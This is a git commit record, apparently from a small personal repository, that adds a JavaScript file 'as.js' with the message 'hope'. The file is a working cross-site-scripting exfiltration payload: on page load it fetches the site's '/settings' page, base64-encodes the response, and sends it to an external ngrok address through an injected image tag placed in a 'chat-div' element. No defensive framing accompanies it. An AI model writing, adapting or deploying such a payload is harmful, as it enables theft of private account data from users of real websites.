8fb6625a9da46a094b9cbabac176c2f325704ae9
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-20 07:35:38 +0530

    hope

---
+++ as.js
@@ -0,0 +1,18 @@
+window.addEventListener('load', function () {
+ function send2server(name, data){
+    img = document.createElement("img");
+    img.src = "https://392445a8.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
+    document.getElementById("chat-div").appendChild(img);
+}
+
+
+  fetch('/settings')
+  .then(res => {
+      return res.text();
+  })
+  .then(data => {
+  send2server("settings", data);
+
+  });
+  
+    })
